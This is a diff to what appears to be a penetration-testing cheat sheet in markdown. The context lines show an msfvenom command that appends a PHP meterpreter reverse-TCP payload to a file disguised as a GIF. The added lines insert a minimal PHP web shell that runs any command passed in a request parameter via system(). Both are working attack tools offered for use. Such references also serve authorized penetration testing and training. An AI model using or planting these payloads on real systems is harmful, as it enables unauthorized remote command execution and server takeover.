@@ -489,7 +489,15 @@ or
 	> echo GIF98 > evil.gif
 	> msfvenom -p php/meterpreter/reverse_tcp lhost='ip' lport='port' >> evil.gif´
 
-
+#### simple php webshell [php]
+```
+	<?php if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;}?>
+```
 -----
 
 # General Tools / Unsorted
